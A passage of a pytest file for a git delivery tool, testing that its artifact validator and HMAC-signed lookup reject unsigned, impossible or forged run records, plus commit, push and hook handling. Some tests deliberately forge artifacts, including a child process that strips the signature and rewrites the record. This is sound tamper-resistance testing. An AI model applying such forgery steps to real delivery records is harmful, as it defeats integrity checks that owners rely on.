    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = "artifact-blocked-positive-authority"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="commit", phase="commit", ok=False,
        outer_status="blocked", outer_reason="git_commit_failed",
        mut_status="blocked", mut_reason="git_commit_failed",
        authority_allowed=True, authority_reason="git_commit_failed",
    )
    assert ns["artifact_is_valid"](payload, run_id) is False


def test_artifact_validator_rejects_success_with_denied_authority(tmp_path: Path):
    # M-2: a normal commit success must carry an allowed=True authority.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = "artifact-success-denied-authority"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="commit", phase="commit", ok=True,
        outer_status="committed", outer_reason="committed",
        mut_status="committed", mut_reason="committed",
        authority_allowed=False, authority_reason="committed",
    )
    assert ns["artifact_is_valid"](payload, run_id) is False


def test_artifact_validator_rejects_authority_reason_drift(monkeypatch, tmp_path: Path):
    # M-2: the mutating authority reason must equal the mutating-run reason.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = "artifact-authority-reason-drift"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="commit", phase="commit", ok=True,
        outer_status="committed", outer_reason="committed",
        mut_status="committed", mut_reason="committed",
        authority_allowed=True, authority_reason="made_up_authority_reason",
    )
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


@pytest.mark.parametrize(
    ("outer_status", "mut_reason"),
    [
        ("committed", "artifact_write_failed_after_side_effect"),
        ("committed_release_failed", "artifact_write_failed_after_side_effect"),
    ],
)
def test_artifact_validator_rejects_recursive_post_side_effect_write_failure(
    monkeypatch, tmp_path: Path, outer_status: str, mut_reason: str
):
    # M-3: the nested mutating run must preserve a real original outcome, never the
    # artifact-write-failure sentinel (outer and nested both recursive).
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = f"artifact-recursive-{outer_status}"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="commit", phase="commit", ok=False,
        outer_status=outer_status, outer_reason="artifact_write_failed_after_side_effect",
        mut_status=outer_status, mut_reason=mut_reason,
        authority_allowed=False, authority_reason=mut_reason,
        side_effects=[{"name": "git_commit", "ok": True}],
    )
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


# main() calls write_artifact exactly once. When that write raises OSError, BOTH fallbacks only
# mutate the dict main() then prints — run_artifact_path stays None, run.artifacts is emptied, and
# no second write is attempted. So no write-failure fallback can ever produce durable bytes for
# artifact_for_run_id to read, and every authenticated write-failure envelope is fabricated
# durable state, however well-formed. The stdout fallbacks themselves are unchanged and still
# covered by the direct main() tests above.
@pytest.mark.parametrize(
    ("operation", "phase"),
    [
        ("pr-grind", "pr_grind"),
        ("commit", "commit"),
    ],
)
def test_status_lookup_rejects_signed_ordinary_artifact_write_failure(
    monkeypatch, tmp_path: Path, operation: str, phase: str
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, operation, False, "blocked", "artifact_write_failed", phase=phase
    )
    # The ordinary fallback is a pre-side-effect, non-mutating outcome: this is the exact shape
    # main() prints, and it must still be undurable.
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path / operation, run_id, payload)


@pytest.mark.parametrize(
    ("outer_status", "mut_reason", "authority_allowed"),
    [
        ("committed", "committed", True),
        ("committed_release_failed", "finalization_lock_release_failed", False),
    ],
)
def test_status_lookup_rejects_signed_post_side_effect_artifact_write_failure(
    monkeypatch, tmp_path: Path, outer_status: str, mut_reason: str, authority_allowed: bool
):
    # The completed-side-effect fallback preserves a real nested mutation, but it too is printed
    # only — never written — so the durable validator must reject it.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = f"post-side-effect-write-failure-{outer_status}"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="commit", phase="commit", ok=False,
        outer_status=outer_status, outer_reason="artifact_write_failed_after_side_effect",
        mut_status=outer_status, mut_reason=mut_reason,
        authority_allowed=authority_allowed, authority_reason=mut_reason,
        side_effects=[{"name": "git_commit", "ok": True}],
    )
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path / outer_status, run_id, payload)


@pytest.mark.parametrize(
    ("operation", "phase", "ok", "status", "reason"),
    [
        ("pr-grind", "pr_grind", True, "pr_grind_clean", "latest_pr_head_clean_read_only"),
        ("commit", "commit", False, "blocked", "git_commit_failed"),
    ],
)
def test_signed_lookup_accepts_reachable_envelope_control(
    monkeypatch, tmp_path: Path, operation: str, phase: str, ok: bool, status: str, reason: str
):
    # Positive control for the write-failure rejections above: the same writer key, directory
    # layout and authenticated lookup accept a reachable envelope, so those rejections cannot be
    # passing because signing or lookup is broken.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(ns, tmp_path, operation, ok, status, reason, phase=phase)
    assert ns["artifact_is_valid"](payload, run_id) is True
    _signed_lookup_accepts(ns, monkeypatch, tmp_path / operation, run_id, payload)


def test_artifact_outcome_contract_admits_no_write_failure_fallback_reasons():
    # Contract truth, not just the validator: neither write-failure sentinel may appear as an
    # allowed durable outcome for any operation or phase.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    reasons = {
        reason
        for phases in ns["ARTIFACT_OUTCOME_CONTRACT"].values()
        for outcomes in phases.values()
        for _ok, _status, reason in outcomes
    }
    assert reasons & {"artifact_write_failed", "artifact_write_failed_after_side_effect"} == set()


def test_artifact_validator_accepts_exact_non_mutating_envelopes(monkeypatch, tmp_path: Path):
    # M-1 positive: reachable pr-grind / delivery-status envelopes with no mutating run, via the
    # real same-process writer + authenticated lookup.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    for label, (operation, ok, status, reason, phase) in {
        "pr_grind": ("pr-grind", True, "pr_grind_clean", "latest_pr_head_clean_read_only", "pr_grind"),
        "delivery_status": ("commit", False, "blocked", "delivery_status_failed", "delivery_status"),
    }.items():
        run_id, payload = artifact_contract_payload(ns, tmp_path, operation, ok, status, reason, phase=phase)
        payload["mutating_run"] = None
        assert ns["artifact_is_valid"](payload, run_id) is True, label
        _signed_lookup_accepts(ns, monkeypatch, tmp_path / label, run_id, payload)


# Representative pre-r12 artifact outcomes for the four fixed-blocked operations, one row per
# outcome class (normal success / reconciliation / release-failed). main() blocks each of these
# operations before run identity, so no such artifact bytes can be produced in production.
_FIXED_BLOCKED_IMPOSSIBLE_OUTCOMES = [
    ("pre-pr-review", "pre_pr_review", True, "pre_pr_review_complete", "busdriver_pre_pr_review_marker_written", True),
    ("pre-pr-review", "pre_pr_review", False, "pre_pr_review_complete_release_failed", "finalization_lock_release_failed", False),
    ("push", "push", True, "pushed", "pushed", True),
    ("push", "push", False, "pushed", "remote_head_post_push_mismatch", False),
    ("push", "push", False, "pushed_release_failed", "finalization_lock_release_failed", False),
    ("pr-create", "pr_create", True, "pr_created", "pr_created", True),
    ("pr-create", "pr_create", False, "pr_created", "pr_created_after_failed_command_reconciled", False),
    ("pr-create", "pr_create", False, "pr_created_release_failed", "finalization_lock_release_failed", False),
    ("merge", "merge", True, "merged", "merged", True),
    ("merge", "merge", False, "merged_release_failed", "finalization_lock_release_failed", False),
]


def test_fixed_early_blocked_operations_are_disjoint_from_artifact_truth():
    # The validator must describe reachable production artifact bytes only. Fixed early policy
    # results are printed and never persisted, so those operations own no artifact truth.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    fixed = set(ns["FIXED_EARLY_BLOCKED_OPERATIONS"])

    assert fixed == {"pre-pr-review", "push", "pr-create", "merge"}
    assert fixed & set(ns["ARTIFACT_OUTCOME_CONTRACT"]) == set()
    assert fixed & set(ns["AUTHORITY_ALLOWED_MUTATING_OUTCOMES"]) == set()
    # verify is absent for a sibling reason (its own fixed verifier blocker), so the exact key
    # set is narrower than "everything not in FIXED_EARLY_BLOCKED_OPERATIONS".
    assert set(ns["ARTIFACT_OUTCOME_CONTRACT"]) == {"pr-grind", "commit"}
    assert ns["MUTATING_ARTIFACT_PHASES"] == {"commit"}
    assert ns["AUTHORITY_ALLOWED_MUTATING_OUTCOMES"] == {"commit": {("committed", "committed")}}


@pytest.mark.parametrize(
    ("operation", "phase", "ok", "status", "reason", "authority_allowed"),
    _FIXED_BLOCKED_IMPOSSIBLE_OUTCOMES,
)
def test_artifact_validator_rejects_fixed_blocked_operation_outcomes(
    tmp_path: Path,
    operation: str,
    phase: str,
    ok: bool,
    status: str,
    reason: str,
    authority_allowed: bool,
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = f"fixed-blocked-{operation}-{reason}"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation=operation, phase=phase, ok=ok,
        outer_status=status, outer_reason=reason,
        mut_status=status, mut_reason=reason,
        authority_allowed=authority_allowed, authority_reason=reason,
    )
    assert ns["artifact_is_valid"](payload, run_id) is False


@pytest.mark.parametrize("operation", ["pre-pr-review", "push", "pr-create", "merge"])
def test_artifact_validator_rejects_fixed_blocked_artifact_write_failures(tmp_path: Path, operation: str):
    # Even the ordinary artifact-write failure is unreachable for a fixed-blocked operation.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, operation, False, "blocked", "artifact_write_failed"
    )
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False


def test_status_lookup_rejects_signed_impossible_fixed_blocked_envelope(monkeypatch, tmp_path: Path):
    # Durable consumer boundary: a fully process-authenticated pr-create success is still an
    # impossible producer outcome and must fail closed at artifact_for_run_id / status mode.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id = "fixed-blocked-signed-pr-create"
    payload = _mutating_artifact_payload(
        ns, tmp_path, run_id=run_id, operation="pr-create", phase="pr_create", ok=True,
        outer_status="pr_created", outer_reason="pr_created",
        mut_status="pr_created", mut_reason="pr_created",
        authority_allowed=True, authority_reason="pr_created",
        side_effects=[{"name": "gh_pr_create", "ok": True}],
    )
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


def _production_deliver(repo: Path, plugin: Path, *extra: str, artifact_dir: Path) -> tuple[subprocess.CompletedProcess[str], dict]:
    env = os.environ.copy()
    env[ARTIFACT_ENV] = str(artifact_dir)
    cp = run([sys.executable, str(PRODUCTION_DELIVER), "--repo", str(repo), "--plugin-root", str(plugin), *extra], env=env)
    return cp, json.loads(cp.stdout)


def test_production_verify_creates_no_run_identity_or_artifact(tmp_path: Path):
    # main() fixed-blocks execute verify on verifier_dispatch_blocker() before run identity,
    # delivery status and artifact handling, so no production verify artifact bytes exist.
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    verifier_cmd = f"{shlex.quote(sys.executable)} -c {shlex.quote('print(1)')}"
    cp, data = _production_deliver(
        repo, plugin, "--mode", "execute", "--operation", "verify", "--verifier", f"smoke={verifier_cmd}",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"]["reason"] == "verifier_containment_unavailable"
    assert data["run"]["run_id"] is None
    assert data["run"]["created_at"] is None
    assert data["run"]["artifacts"] == []
    assert data["run_artifact_path"] is None
    assert data["mutating_run"] is None
    assert data["verifiers"] == []
    assert not artifact_dir.exists()

    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    assert "verify" not in ns["ARTIFACT_OUTCOME_CONTRACT"]


def test_production_pr_grind_without_pr_creates_no_run_artifact(tmp_path: Path):
    # execute pr-grind without --pr sets pr_required but never sets write_run_artifact, so the
    # outcome is printed only and owns no durable artifact truth.
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    cp, data = _production_deliver(
        repo, plugin, "--mode", "execute", "--operation", "pr-grind", "--run-id", "pr-grind-no-pr",
        artifact_dir=artifact_dir,
    )

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"]["reason"] == "pr_required"
    assert data["run_artifact_path"] is None
    assert data["mutating_run"] is None
    assert not artifact_dir.exists()

    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    assert (False, "blocked", "pr_required") not in ns["ARTIFACT_OUTCOME_CONTRACT"]["pr-grind"]["pr_grind"]


def test_status_lookup_rejects_signed_verify_envelope(monkeypatch, tmp_path: Path):
    # A structurally complete, process-authenticated verify success is still impossible in
    # production (the verifier blocker fires first) and must fail closed at durable lookup.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, "verify", True, "verified", "verified", phase="verify"
    )
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


def test_status_lookup_rejects_signed_pr_grind_pr_required_envelope(monkeypatch, tmp_path: Path):
    # pr-grind without a PR never persists, so an authenticated pr_required artifact is
    # fabricated durable state.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, "pr-grind", False, "blocked", "pr_required", phase="pr_grind"
    )
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is False
    _signed_lookup_rejects(ns, monkeypatch, tmp_path, run_id, payload)


def test_status_lookup_accepts_signed_reachable_pr_grind_envelope(monkeypatch, tmp_path: Path):
    # Positive control for the signed same-process lookup, on a currently reachable production
    # shape (pr-grind with a PR), so the rejections above cannot pass vacuously.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, "pr-grind", True, "pr_grind_clean", "latest_pr_head_clean_read_only", phase="pr_grind"
    )
    payload["mutating_run"] = None
    assert ns["artifact_is_valid"](payload, run_id) is True
    _signed_lookup_accepts(ns, monkeypatch, tmp_path, run_id, payload)


def test_status_lookup_accepts_signed_blocked_commit_reviewed_paths_unavailable(monkeypatch, tmp_path: Path):
    # commit_staged_index() returns error="reviewed_paths_unavailable" before any ref write;
    # execute_mutating_operation turns it into a blocked commit that production main persists.
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    run_id, payload = artifact_contract_payload(
        ns, tmp_path, "commit", False, "blocked", "reviewed_paths_unavailable"
    )
    assert ns["artifact_is_valid"](payload, run_id) is True
    _signed_lookup_accepts(ns, monkeypatch, tmp_path, run_id, payload)


# commit_staged_index produces a reason literal two ways: a direct `return {"error": "literal"}`,
# and `return fail_and_restore_reviewed_tree("literal")`. The nested helper itself returns
# {"error": error} — an ast.Name — so a collector that only walks direct dict returns is blind to
# every literal that reaches the wire through the helper.
_COMMIT_ERROR_HELPER = "fail_and_restore_reviewed_tree"


def _commit_error_literals(source: str) -> tuple[set[str], set[str]]:
    """Return (direct, helper) reason literals commit_staged_index can emit as its "error"."""
    fn = next(
        node
        for node in ast.walk(ast.parse(source))
        if isinstance(node, ast.FunctionDef) and node.name == "commit_staged_index"
    )
    direct = {
        value.value
        for node in ast.walk(fn)
        if isinstance(node, ast.Return) and isinstance(node.value, ast.Dict)
        for key, value in zip(node.value.keys, node.value.values)
        if isinstance(key, ast.Constant)
        and key.value == "error"
        and isinstance(value, ast.Constant)
        and isinstance(value.value, str)
    }
    helper = {
        arg.value
        for node in ast.walk(fn)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Name)
        and node.func.id == _COMMIT_ERROR_HELPER
        for arg in node.args
        if isinstance(arg, ast.Constant) and isinstance(arg.value, str)
    }
    return direct, helper


def test_commit_staged_index_error_literals_are_covered_by_contract_truth():
    # Source-closure test: every string literal the producer can put on the "error" key must
    # already carry contract truth, whether it is returned directly or handed to the restore
    # helper. Derived from the AST, not from the constant, so adding a new producer error without
    # extending the contract fails here.
    direct, helper = _commit_error_literals(PRODUCTION_DELIVER.read_text())

    # Guards against either AST shape silently drifting to zero matches.
    assert len(direct) >= 15
    assert "reviewed_paths_unavailable" in direct
    assert helper == {
        "committed_tree_or_parent_mismatch_after_hooks",
        "committed_message_mismatch_after_hooks",
        "git_commit_failed_or_hook_drift",
    }

    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    # No-side-effect producer errors become blocked commit artifacts; the post-publish ones are
    # the explicitly documented completed/reconciliation reasons.
    covered = ns["_COMMIT_FAILURE_REASONS"] | ns["_COMMIT_RECONCILIATION_REASONS"]
    assert (direct | helper) - covered == set()


def test_commit_error_literal_closure_catches_a_new_helper_call_reason():
    # Semantic guard for the closure above: a reason that reaches the wire ONLY through the
    # restore helper must be collected and must fail the contract comparison while it is absent
    # from contract truth. A direct-returns-only collector reports an empty diff here and the
    # blind spot reopens.
    source = PRODUCTION_DELIVER.read_text()
    injected = source.replace(
        f'return {_COMMIT_ERROR_HELPER}("git_commit_failed_or_hook_drift")',
        f'return {_COMMIT_ERROR_HELPER}("uncontracted_helper_reason")',
        1,
    )
    assert injected != source

    direct, helper = _commit_error_literals(injected)
    assert "uncontracted_helper_reason" in helper
    assert "uncontracted_helper_reason" not in direct

    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    covered = ns["_COMMIT_FAILURE_REASONS"] | ns["_COMMIT_RECONCILIATION_REASONS"]
    assert (direct | helper) - covered == {"uncontracted_helper_reason"}


def test_process_external_artifact_requires_complete_authentication_shape(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    artifact_dir = tmp_path / "delivery-runs"
    artifact_dir.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    run_id = "external-auth-shape"
    false_flags = {key: False for key in BLOCKED_KEYS}
    payload = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "pr-grind",
        "decision": {"status": "pr_grind_clean", "reason": "latest_pr_head_clean_read_only", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-15T00:00:00Z",
            "phase": "pr_grind",
            "status": "pr_grind_clean",
            "reason": "latest_pr_head_clean_read_only",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
        "writer_authentication": {
            "schema": "hermes-busdriver-delivery-artifact-auth/v1",
            "algorithm": "hmac-sha256-process-scoped",
            "key_id": "a" * 32,
            "mac": "b" * 64,
        },
    }
    artifact = artifact_dir / "external.json"
    artifact.write_text(json.dumps(payload))
    artifact.chmod(0o600)
    assert ns["has_process_external_artifact"](run_id) is True

    for field in ("schema", "algorithm", "key_id", "mac"):
        malformed = json.loads(json.dumps(payload))
        malformed["writer_authentication"].pop(field)
        artifact.write_text(json.dumps(malformed))
        artifact.chmod(0o600)
        assert ns["has_process_external_artifact"](run_id) is False, f"missing {field}"

    invalid_values = {
        "schema": [1, "hermes-busdriver-delivery-artifact-auth/v0"],
        "algorithm": [[], "sha256"],
        "key_id": [1, "a" * 31, "z" * 32],
        "mac": [1, "b" * 63, "z" * 64],
    }
    for field, values in invalid_values.items():
        for value in values:
            malformed = json.loads(json.dumps(payload))
            malformed["writer_authentication"][field] = value
            artifact.write_text(json.dumps(malformed))
            artifact.chmod(0o600)
            assert ns["has_process_external_artifact"](run_id) is False, f"invalid {field}: {value!r}"


def test_status_lookup_rejects_schema_valid_unsigned_forged_artifact(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    artifact_dir = tmp_path / "delivery-runs"
    artifact_dir.mkdir(mode=0o700)
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    run_id = "forged-run"
    false_flags = {key: False for key in BLOCKED_KEYS}
    forged = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "pr-grind",
        "decision": {"status": "pr_grind_clean", "reason": "latest_pr_head_clean_read_only", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-13T00:00:00Z",
            "phase": "pr_grind",
            "status": "pr_grind_clean",
            "reason": "latest_pr_head_clean_read_only",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
    }
    forged_path = artifact_dir / "20990101-000000-forged.json"
    forged_path.write_text(json.dumps(forged))
    forged_path.chmod(0o600)
    assert ns["artifact_is_valid"](forged, run_id) is True
    assert ns["artifact_for_run_id"](run_id) is None


def test_artifact_signing_capability_is_parent_memory_only(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    artifact_dir = tmp_path / "delivery-runs"
    monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    run_id = "parent-memory-run"
    false_flags = {key: False for key in BLOCKED_KEYS}
    payload = {
        "schema": "hermes-busdriver-deliver/v0",
        "version": 1,
        "ok": True,
        "mode": "execute",
        "operation": "pr-grind",
        "decision": {"status": "pr_grind_clean", "reason": "latest_pr_head_clean_read_only", **false_flags},
        "run": {
            "schema": "hermes-busdriver-delivery-run/v0",
            "version": 1,
            "run_id": run_id,
            "created_at": "2026-07-14T00:00:00Z",
            "phase": "pr_grind",
            "status": "pr_grind_clean",
            "reason": "latest_pr_head_clean_read_only",
            "repo_root": str(tmp_path),
            "pr_number": None,
            "authority": false_flags,
            "artifacts": [],
        },
        "mutating_run": None,
    }
    ns["write_artifact"](payload)
    assert ns["artifact_for_run_id"](run_id) is not None
    assert not (tmp_path / ".hermes-busdriver-delivery-auth").exists()
    assert not list(tmp_path.rglob("artifact-hmac.key"))

    code = (
        "import runpy,sys; "
        f"ns=runpy.run_path({str(PRODUCTION_DELIVER)!r}); "
        f"sys.exit(0 if ns['artifact_for_run_id']({run_id!r}) is None else 9)"
    )
    child = subprocess.run(
        [sys.executable, "-I", "-c", code],
        text=True,
        capture_output=True,
        env={ARTIFACT_ENV: str(artifact_dir), "HOME": str(tmp_path)},
        check=False,
    )
    assert child.returncode == 0

    written = next(artifact_dir.glob("*.json"))
    forge_code = (
        "import json,os,runpy; "
        f"os.environ[{ARTIFACT_ENV!r}]={str(artifact_dir)!r}; "
        f"n=runpy.run_path({str(PRODUCTION_DELIVER)!r}); "
        f"d=json.loads(open({str(written)!r}).read()); "
        "d.pop('writer_authentication',None); "
        "d['decision']['reason']='same-uid-child-forgery'; "
        f"[os.unlink(str(x)) for x in __import__('pathlib').Path({str(artifact_dir)!r}).glob('*.json')]; "
        "n['write_artifact'](d)"
    )
    forged = subprocess.run([sys.executable, "-I", "-c", forge_code], text=True, capture_output=True)
    assert forged.returncode == 0, forged.stderr
    assert ns["artifact_for_run_id"](run_id) is None


def test_live_remote_branch_head_preserves_credentials_env(monkeypatch, tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    captured = {}

    class CP:
        returncode = 0
        stdout = "abc123\trefs/heads/feature\n"
        stderr = ""

    def fake_run(_cmd, **kwargs):
        captured.update(env=kwargs.get("env"))
        return CP()

    monkeypatch.setenv("SSH_AUTH_SOCK", "/tmp/agent.sock")
    monkeypatch.setattr(ns["live_remote_branch_head"].__globals__["subprocess"], "run", fake_run)
    assert ns["live_remote_branch_head"](init_repo(tmp_path / "repo"), "feature", "origin") == ("abc123", None)
    assert {k: captured["env"][k] for k in ("SSH_AUTH_SOCK", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_NOSYSTEM")} == {"SSH_AUTH_SOCK": "/tmp/agent.sock", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}


def test_commit_marker_state_dirs_include_default_claude_and_opencode(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    markers = [".claude/pr-backstop-verdict.local.json", ".claude/pr-grind-clean.local", ".opencode/pr-backstop-verdict.local.json", ".opencode/skip-litmus.local"]
    for path in markers:
        marker = repo / path
        marker.parent.mkdir(exist_ok=True)
        marker.write_text("{}\n")
        assert run(["git", "add", path], repo).returncode == 0

    args = type("Args", (), {"busdriver_state_dir_name": None})()
    assert ns["busdriver_marker_state_dirs"](args) == (".claude", ".opencode")
    assert ns["staged_marker_entries"](repo, ns["busdriver_marker_state_dirs"](args)) == markers


def test_staged_marker_entries_detects_marker_renames_with_rename_detection_enabled(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")
    for key, value in (("user.email", "test@example.test"), ("user.name", "Test User")):
        assert run(["git", "config", key, value], repo).returncode == 0
    marker = repo / ".claude" / "litmus-passed.local"
    marker.parent.mkdir()
    marker.write_text("reviewed\n")
    assert run(["git", "add", ".claude/litmus-passed.local"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    assert run(["git", "config", "--local", "diff.renames", "true"], repo).returncode == 0
    assert run(["git", "mv", ".claude/litmus-passed.local", "moved.txt"], repo).returncode == 0
    assert ns["staged_marker_entries"](repo, (".claude", ".opencode")) == [".claude/litmus-passed.local"]


def test_github_slug_from_remote_url_accepts_only_supported_github_shapes():
    ns = runpy.run_path(str(DELIVER))

    assert ns["github_slug_from_remote_url"]("https://github.com/owner/repo.git") == "owner/repo"
    assert ns["github_slug_from_remote_url"]("git@github.com:owner/repo.git") == "owner/repo"
    assert ns["github_slug_from_remote_url"]("ssh://git@github.com/owner/repo") == "owner/repo"
    assert ns["github_slug_from_remote_url"]("https://example.test/owner/repo.git") is None


def test_push_command_disables_hooks_with_exact_remote_lease(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo")

    cmd = ns["push_command"](repo, "origin", "feature", None, "abc123")

    assert cmd[:4] == ["git", "-c", f"core.hooksPath={os.devnull}", "push"]
    assert "--no-follow-tags" in cmd
    assert "--force-with-lease=refs/heads/feature:" in cmd
    assert cmd[-2:] == ["origin", "abc123:refs/heads/feature"]


def test_commit_staged_index_preserves_hook_mutation_for_manual_reconciliation(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-hook-fail")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-mutated-before-fail\n' > tracked.txt\ngit add tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    (repo / "tracked.txt").write_text("reviewed\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "hook fails", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "git_commit_failed_or_hook_drift"
    assert effect["restore_reviewed_index_ok"] is False
    assert effect["restore_reviewed_worktree_ok"] is False
    assert effect["reconciliation_required"] is True
    assert effect["worktree_index_preserved"] is True
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert run(["git", "write-tree"], repo).stdout.strip() != effect["expected_tree"]
    assert (repo / "tracked.txt").read_text() == "hook-mutated-before-fail\n"


def test_commit_staged_index_blocks_preexisting_untracked_reviewed_deletion_replacement(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-reviewed-untracked-replacement")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    before = run(["git", "rev-parse", "HEAD"], repo).stdout.strip()
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0
    (repo / "tracked.txt").write_text("user replacement\n")

    effect = ns["commit_staged_index"](repo, "delete tracked", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
    assert effect["error"] == "pre_commit_reviewed_untracked_worktree"
    assert run(["git", "rev-parse", "HEAD"], repo).stdout.strip() == before
    assert (repo / "tracked.txt").read_text() == "user replacement\n"
    assert any(substep["name"] == "git_pre_commit_reviewed_untracked_worktree_check" for substep in effect["substeps"])


def test_commit_staged_index_preserves_untracked_hook_recreation_after_failure(tmp_path: Path):
    ns = runpy.run_path(str(DELIVER))
    repo = init_repo(tmp_path / "repo-hook-delete-untracked")
    assert run(["git", "config", "user.email", "test@example.com"], repo).returncode == 0
    assert run(["git", "config", "user.name", "Test User"], repo).returncode == 0
    (repo / "tracked.txt").write_text("one\n")
    assert run(["git", "add", "tracked.txt"], repo).returncode == 0
    assert run(["git", "-c", "commit.gpgsign=false", "commit", "-m", "init"], repo).returncode == 0
    hook = repo / ".git" / "hooks" / "pre-commit"
    hook.write_text("#!/bin/sh\nprintf 'hook-recreated-untracked\n' > tracked.txt\nexit 1\n")
    hook.chmod(0o755)
    assert run(["git", "rm", "tracked.txt"], repo).returncode == 0

    effect = ns["commit_staged_index"](repo, "delete file", {"BUSDRIVER_STATE_DIR": ".claude"})

    assert effect["ok"] is False
